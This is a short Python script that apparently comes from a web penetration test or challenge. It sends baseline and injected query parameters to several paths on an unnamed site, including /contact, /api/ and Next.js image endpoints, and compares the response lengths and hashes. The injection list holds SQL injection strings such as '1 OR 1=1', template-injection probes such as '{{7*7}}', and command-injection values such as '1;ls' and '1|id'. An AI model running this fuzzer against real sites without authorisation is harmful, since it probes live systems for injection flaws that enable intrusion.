import sys, re, json, hashlib, time
sys.path.insert(0,"w13")
from sess import req, B

def h(t): return hashlib.md5((t or "").encode(errors="ignore")).hexdigest()[:12]

def diff(path, params, base=None, test="1"):
    """send baseline vs injected, report len/hash/title deltas"""
    out=[]
    b=req(path, params=base or {k:test for k in params})
    out.append(("base", b.status_code, len(b.text), h(b.text), b.headers.get("content-type")))
    for inj in ["1'","1\"","1 AND 1=1","1 AND 1=2","1'--","1 OR 1=1","{{7*7}}","${7*7}","1;ls","1|id"]:
        p=dict(base or {k:test for k in params})
        k=list(params)[0]
        p[k]=inj
        try:
            r=req(path, params=p)
            out.append((inj, r.status_code, len(r.text), h(r.text), r.headers.get("content-type")))
        except Exception as e:
            out.append((inj,"EXC",str(e)[:40],"",""))
    return out

TARGETS = [
  ("/", ["page"]),
  ("/", ["id"]),
  ("/", ["search"]),
  ("/", ["zzz"]),
  ("/contact", ["cb"]),
  ("/contact", ["q"]),
  ("/404", ["q"]),
  ("/api/", ["id"]),
  ("/_next/image", ["w"]),
  ("/_next/image", ["q"]),
]

for path, params in TARGETS:
    print("="*70)
    print("TARGET", path, params)
    for row in diff(path, params):
        print("  ", row)
